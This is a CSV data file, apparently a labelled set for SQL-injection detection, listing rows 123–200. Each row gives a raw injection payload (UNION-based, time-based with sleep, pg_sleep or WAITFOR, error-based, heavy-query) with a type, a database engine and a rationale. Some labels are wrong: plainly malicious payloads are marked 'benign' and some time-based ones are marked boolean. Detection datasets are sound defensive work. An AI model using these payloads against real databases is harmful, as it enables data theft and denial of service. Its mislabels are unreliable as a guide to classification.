id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
123,"-6096' ) where 1316 = 1316 union all select 1316,1316,1316,1316,1316,1316,1316,1316#",boolean_blind,generic,0.95,Boolean logic pattern 'where 1316 = 1316 ' detected for blind inference or tautology,1
124,"1, ( select ( case when ( 9644 = 9644 ) then dbms_pipe.receive_message ( chr ( 75 ) ||chr ( 78 ) ||chr ( 104 ) ||chr ( 98 ) ,5 ) else 1/ ( select 0 from dual ) end ) from dual )",boolean_blind,oracle,0.95,Conditional logic ('CASE WHEN' or 'IF') used for boolean-based inference,1
125,"1"" ) ) and make_set ( 8403 = 8403,8899 ) and ( ( ""ieuj"" like ""ieuj",benign,generic,0.55,"UNCERTAIN: Payload '1"" ) ) and make_set ...' contains SQL keywords but lacks clear attack signals.",2
126,1 where 2384 = 2384 and ( select * from ( select ( sleep ( 5 ) ) ) gcrr ) #,boolean_blind,mysql,0.95,Boolean logic pattern 'where 2384 = 2384 ' detected for blind inference or tautology,2
127,"1%' ) and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( '%' = '",boolean_blind,sqlite,0.95,Boolean logic pattern 'and 3202 = like ' detected for blind inference or tautology,1
128,"1"" ) union all select null,null,null,null,null,null,null,null,null--",union_based,generic,0.95,"UNION SELECT pattern detected in '1"" ) union all select null,nul...' for data exfiltration",3
129,"1 ) as mnyy where 4409 = 4409 union all select null,null,null,null--",boolean_blind,generic,0.95,Boolean logic pattern 'where 4409 = 4409 ' detected for blind inference or tautology,1
130,"1"" where 9725 = 9725",boolean_blind,generic,0.95,Boolean logic pattern 'where 9725 = 9725' detected for blind inference or tautology,2
131,"-7580' ) ) as mmqt where 3468 = 3468 union all select 3468,3468,3468,3468,3468,3468#",boolean_blind,generic,0.95,Boolean logic pattern 'where 3468 = 3468 ' detected for blind inference or tautology,1
132,"1%"" union all select null,null,null,null,null,null--",union_based,generic,0.95,"UNION SELECT pattern detected in '1%"" union all select null,null...' for data exfiltration",3
133,"1 ) ) ) or 1022 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",heavy_query,oracle,0.95,Multiple joins on Oracle metadata tables ('all_users') used as heavy query DoS,1
134,"1"" ) as ipxg where 4031 = 4031 and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) --",boolean_blind,oracle,0.95,Boolean logic pattern 'where 4031 = 4031 ' detected for blind inference or tautology,1
135,"1' ) as jysm where 8961 = 8961 union all select null,null#",boolean_blind,generic,0.95,Boolean logic pattern 'where 8961 = 8961 ' detected for blind inference or tautology,1
136,1' ) ) as xcvg where 1157 = 1157 rlike ( select ( case when ( 7689 = 7689 ) then 1 else 0x28 end ) ) --,boolean_blind,mysql,0.95,'RLIKE' regex-based boolean inference token detected (MySQL signature),3
137,"1"" ) and sleep ( 5 ) and ( ""ytof"" = ""ytof",boolean_blind,mysql,0.95,"Boolean logic pattern 'and ( ""ytof"" = ""ytof' detected for blind inference or tautology",1
138,"1"" ) as pobe where 1704 = 1704",boolean_blind,generic,0.95,Boolean logic pattern 'where 1704 = 1704' detected for blind inference or tautology,2
139,"1"" where 9332 = 9332 union all select null,null,null,null,null,null,null,null,null--",boolean_blind,generic,0.95,Boolean logic pattern 'where 9332 = 9332 ' detected for blind inference or tautology,1
140,-2432' ) ) or ( 8459 = 8459 ) *4906 and ( ( 'ejhp' = 'ejhp,boolean_blind,generic,0.95,Boolean logic pattern 'or ( 8459 = 8459 )' detected for blind inference or tautology,2
141,-8641%' order by 1--,benign,generic,0.8,No definitive SQL injection signals detected in payload: '-8641%' order by 1--...',3
142,"-3249' ) ) ) union all select 6309,6309#",union_based,generic,0.95,UNION SELECT pattern detected in '-3249' ) ) ) union all select ...' for data exfiltration,3
143,1' ) ) or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ) and ( ( 'yqbo' = 'yqbo,time_blind,mysql,0.95,'sleep()' function token confirms MySQL/MariaDB time-based blind injection,2
144,1' ) as nexa where 6740 = 6740,boolean_blind,generic,0.95,Boolean logic pattern 'where 6740 = 6740' detected for blind inference or tautology,2
145,"1"" ) and 6414 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) and ( ""rvub"" like ""rvub",benign,generic,0.55,"UNCERTAIN: Payload '1"" ) and 6414 = ( se...' contains SQL keywords but lacks clear attack signals.",1
146,"-7741' ) where 8271 = 8271 union all select 8271,8271,8271,8271,8271,8271,8271#",boolean_blind,generic,0.95,Boolean logic pattern 'where 8271 = 8271 ' detected for blind inference or tautology,1
147,"-5009 ) where 8463 = 8463 union all select 8463,8463,8463,8463,8463,8463--",boolean_blind,generic,0.95,Boolean logic pattern 'where 8463 = 8463 ' detected for blind inference or tautology,1
148,"1%"" ) and 8407 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and ( ""%"" = """,heavy_query,postgresql,0.95,"'generate_series' with large range (5,000,000) detected (PostgreSQL DoS)",3
149,1'+ ( select shec where 3589 = 3589 and 6969 = ( select 6969 from pg_sleep ( 5 ) ) ) +',boolean_blind,postgresql,0.95,Boolean logic pattern 'where 3589 = 3589 ' detected for blind inference or tautology,2
150,"-4305 ) as ldrt where 2567 = 2567 union all select 2567,2567,2567,2567,2567,2567,2567#",boolean_blind,generic,0.95,Boolean logic pattern 'where 2567 = 2567 ' detected for blind inference or tautology,1
151,-4322' ) ) as magw where 1627 = 1627 or 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) --,boolean_blind,oracle,0.95,Boolean logic pattern 'where 1627 = 1627 ' detected for blind inference or tautology,3
152,"1' and make_set ( 8403 = 8403,8899 ) and 'niux' = 'niux",boolean_blind,generic,0.95,Boolean logic pattern 'and 'niux' = 'niux' detected for blind inference or tautology,2
153,end and ( 4610 = 4610,boolean_blind,generic,0.95,Boolean logic pattern 'and ( 4610 = 4610' detected for blind inference or tautology,2
154,"1 ) ) union all select null,null,null--",union_based,generic,0.95,"UNION SELECT pattern detected in '1 ) ) union all select null,nu...' for data exfiltration",3
155,1' ) or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ) and ( 'brob' = 'brob,boolean_blind,mysql,0.95,Boolean logic pattern 'and ( 'brob' = 'brob' detected for blind inference or tautology,2
156,"1'|| ( select 'xjcg' from dual where 5815 = 5815 union all select null,null,null#",boolean_blind,oracle,0.95,Boolean logic pattern 'where 5815 = 5815 ' detected for blind inference or tautology,1
157,"1' ) ) and 6414 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) and ( ( 'fowu' like 'fowu",benign,generic,0.55,UNCERTAIN: Payload '1' ) ) and 6414 = ( ...' contains SQL keywords but lacks clear attack signals.,1
158,1' ) where 5280 = 5280 and 4595 = 4595#,boolean_blind,generic,0.95,Boolean logic pattern 'where 5280 = 5280 ' detected for blind inference or tautology,3
159,"1%"" and 8148 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",boolean_blind,sqlite,0.95,Boolean logic pattern 'and 8148 = like ' detected for blind inference or tautology,1
160,1 ) where 3565 = 3565 and 6969 = ( select 6969 from pg_sleep ( 5 ) ) --,boolean_blind,postgresql,0.95,Boolean logic pattern 'where 3565 = 3565 ' detected for blind inference or tautology,2
161,( select * from ( select ( sleep ( 5 ) ) ) srmq ) and ( 'kerg' like 'kerg,time_blind,mysql,0.95,'sleep()' function token confirms MySQL/MariaDB time-based blind injection,2
162,1' ) rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo ),boolean_blind,mysql,0.95,'RLIKE' regex-based boolean inference token detected (MySQL signature),3
163,"1"" where 9760 = 9760 or 4240 = ( select 4240 from pg_sleep ( 5 ) ) --",boolean_blind,postgresql,0.95,Boolean logic pattern 'where 9760 = 9760 ' detected for blind inference or tautology,2
164,"1'|| ( select 'vqag' from dual where 8154 = 8154 union all select null,null,null,null,null,null,null,null,null,null--",boolean_blind,oracle,0.95,Boolean logic pattern 'where 8154 = 8154 ' detected for blind inference or tautology,1
165,"call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( ( ""squx"" like ""squx",benign,generic,0.55,UNCERTAIN: Payload 'call regexp_substrin...' contains SQL keywords but lacks clear attack signals.,1
166,"1"" ) ) ) and 4967 = 8866 and ( ( ( ""jzyn"" like ""jzyn",boolean_blind,generic,0.95,Boolean logic pattern 'and 4967 = 8866 ' detected for blind inference or tautology,3
167,"1"" ) as oztl where 6655 = 6655 or 8315 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",boolean_blind,db2,0.95,Boolean logic pattern 'where 6655 = 6655 ' detected for blind inference or tautology,3
168,if ( 7899 = 7899 ) select 7899 else drop function zbbp--,benign,generic,0.55,UNCERTAIN: Payload 'if ( 7899 = 7899 ) s...' contains SQL keywords but lacks clear attack signals.,1
169,"1"" ) ) ( select ( case when ( 5451 = 5451 ) then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null ) else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 ) end ) from information_schema.system_users ) and ( ( ""uwdz"" = ""uwdz",boolean_blind,mysql,0.95,Conditional logic ('CASE WHEN' or 'IF') used for boolean-based inference,2
170,"1'|| ( select 'ativ' from dual where 4746 = 4746 union all select null,null,null,null#",boolean_blind,oracle,0.95,Boolean logic pattern 'where 4746 = 4746 ' detected for blind inference or tautology,1
171,"1,iif ( 6625 = 6625,1,1/0 )",benign,generic,0.8,"No definitive SQL injection signals detected in payload: '1,iif ( 6625 = 6625,1,1/0 )...'",3
172,"-9922' ) ) union all select 2193,2193,2193--",union_based,generic,0.95,UNION SELECT pattern detected in '-9922' ) ) union all select 21...' for data exfiltration,3
173,"1"" and 6414 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 )",benign,generic,0.55,"UNCERTAIN: Payload '1"" and 6414 = ( sele...' contains SQL keywords but lacks clear attack signals.",1
174,"select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3",heavy_query,firebird,0.95,Joins on Firebird metadata tables ('domain.domains') detected for heavy query,1
175,"select count ( * ) from generate_series ( 1,5000000 ) ) ||'",heavy_query,postgresql,0.95,"'generate_series' with large range (5,000,000) detected (PostgreSQL DoS)",3
176,1' ) ) and 6240 = ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ) and ( ( 'uqfs' = 'uqfs,benign,firebird,0.55,UNCERTAIN: Payload '1' ) ) and 6240 = ( ...' contains SQL keywords but lacks clear attack signals.,1
177,"-9959"" ) or 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ""vcwc"" = ""vcwc",boolean_blind,oracle,0.95,Boolean logic pattern 'or 4747 = dbms_utility' detected for blind inference or tautology,3
178,"select * from generate_series ( 7610,7610,case when ( 7610 = 9416 ) then 1 else 0 end ) limit 1--",boolean_blind,generic,0.95,Conditional logic ('CASE WHEN' or 'IF') used for boolean-based inference,3
179,"1 where 4477 = 4477 union all select null,null,null,null,null,null,null,null,null,null--",boolean_blind,generic,0.95,Boolean logic pattern 'where 4477 = 4477 ' detected for blind inference or tautology,1
180,"call regexp_substring ( repeat ( right ( char ( 3702 ) ,0 ) ,500000000 ) ,null ) and ( ( ( ""yzjl"" like ""yzjl",benign,generic,0.55,UNCERTAIN: Payload 'call regexp_substrin...' contains SQL keywords but lacks clear attack signals.,1
181,"1' ) ) and ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9067 = 9067,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) and ( ( 'mymg' = 'mymg",benign,mysql,0.55,UNCERTAIN: Payload '1' ) ) and ( select ...' contains SQL keywords but lacks clear attack signals.,1
182,"1 where 2751 = 2751 union all select null,null,null,null--",boolean_blind,generic,0.95,Boolean logic pattern 'where 2751 = 2751 ' detected for blind inference or tautology,1
183,"1%"" ) ) ) or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 ) and ( ( ( ""%"" = """,error_based,mysql,0.95,'extractvalue'/'updatexml' XPath error tokens detected (MySQL signature),1
184,1 ) and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( 3530 = 3530,boolean_blind,oracle,0.95,Boolean logic pattern 'and ( 3530 = 3530' detected for blind inference or tautology,2
185,"1 ) ) ) or 8156 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",heavy_query,postgresql,0.95,"'generate_series' with large range (5,000,000) detected (PostgreSQL DoS)",3
186,1'|| ( select 'znba' where 8323 = 8323,boolean_blind,generic,0.95,Boolean logic pattern 'where 8323 = 8323' detected for blind inference or tautology,3
187,waitfor delay '0:0:5' and ( ( ( 8981 = 8981,time_blind,mssql,0.95,'WAITFOR DELAY' statement confirms MSSQL time-based blind injection,3
188,"-6948"" ) ) as ojjl where 1300 = 1300 or 6872 = 6872--",boolean_blind,generic,0.95,Boolean logic pattern 'where 1300 = 1300 ' detected for blind inference or tautology,3
189,"select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and ( ( 'bhlx' like 'bhlx",heavy_query,oracle,0.95,Multiple joins on Oracle metadata tables ('all_users') used as heavy query DoS,1
190,"1"" ) ) as ndbk where 5042 = 5042 and 8594 = ( select 8594 from pg_sleep ( 5 ) ) --",boolean_blind,postgresql,0.95,Boolean logic pattern 'where 5042 = 5042 ' detected for blind inference or tautology,2
191,"-1917"" ) or 8571 = 8571--",boolean_blind,generic,0.95,Boolean logic pattern 'or 8571 = 8571' detected for blind inference or tautology,3
192,"1"" and elt ( 2373 = 5817,5817 ) and ""rsdt"" = ""rsdt",boolean_blind,generic,0.95,"Boolean logic pattern 'and ""rsdt"" = ""rsdt' detected for blind inference or tautology",2
193,1' ) ) ) and ( 8982 = 8027 ) *8027 and ( ( ( 'qkrv' = 'qkrv,boolean_blind,generic,0.95,Boolean logic pattern 'and ( 8982 = 8027 )' detected for blind inference or tautology,2
194,select ( case when ( 2350 = 8682 ) then 2350 else 1/ ( select 0 ) end ) --,boolean_blind,generic,0.95,Conditional logic ('CASE WHEN' or 'IF') used for boolean-based inference,3
195,select pg_sleep ( 5 ) and ( '%' = ',time_blind,postgresql,0.95,'pg_sleep()' token confirms PostgreSQL time-based blind injection,2
196,"1' ) or elt ( 6272 = 6272,sleep ( 5 ) ) and ( 'yznd' like 'yznd",time_blind,mysql,0.95,'sleep()' function token confirms MySQL/MariaDB time-based blind injection,1
197,"1'|| ( select 'eayf' where 5431 = 5431 and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null ) ) ||'",boolean_blind,generic,0.95,Boolean logic pattern 'where 5431 = 5431 ' detected for blind inference or tautology,2
198,"select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4# ljph",benign,generic,0.55,UNCERTAIN: Payload 'select count ( * ) f...' contains SQL keywords but lacks clear attack signals.,1
199,-3436 ) or 9281 = 3172,boolean_blind,generic,0.95,Boolean logic pattern 'or 9281 = 3172' detected for blind inference or tautology,3
200,"-1907"" ) ) or 2782 = 3591",boolean_blind,generic,0.95,Boolean logic pattern 'or 2782 = 3591' detected for blind inference or tautology,3
